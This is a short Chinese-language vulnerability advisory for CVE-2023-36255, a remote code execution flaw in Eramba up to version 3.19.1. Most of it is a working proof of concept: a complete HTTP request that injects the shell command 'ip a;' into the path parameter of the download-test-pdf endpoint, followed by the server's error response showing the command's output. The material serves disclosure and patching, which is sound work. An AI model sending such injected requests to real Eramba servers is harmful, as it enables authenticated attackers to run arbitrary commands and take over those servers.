**0x01 漏洞详情**

**CVE-2023-36255**

**漏洞类型：**远程代码执行

**影响：**接管服务器

**简述：**Eramba存在远程代码执行漏洞，允许经过身份验证的用户执行任意代码。

### 

**0x02 影响版本**

- Enterprise and Community edition <= 3.19.1

```

GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1
Host: [redacted]
Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://[redacted]/settings
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```



```
HTTP/1.1 500 Internal Server Error
Date: Fri, 31 Mar 2023 12:37:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Access-Control-Allow-Origin: *
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="test.pdf"
X-DEBUGKIT-ID: d383f6d4-6680-4db0-b574-fe789abc1718
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 2033469

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/> <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
Error: The exit status code '127' says something went wrong:
stderr: &quot;sh: 1: --dpi: not found
&quot;
stdout: &quot;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether [redacted] brd ff:ff:ff:ff:ff:ff
    inet [redacted] brd [redacted] scope global ens33
       valid_lft forever preferred_lft forever
    inet6 [redacted] scope link
       valid_lft forever preferred_lft forever
&quot;
command: ip a; --dpi '90' --lowquality --margin-bottom '0' --margin-left '0'
--margin-right '0' --margin-top '0' --orientation 'Landscape'
--javascript-delay '1000' '/tmp/knp_snappy6426d4231040e1.91046751.html'
'/tmp/knp_snappy6426d423104587.46971034.pdf'. </title>

[...]
```

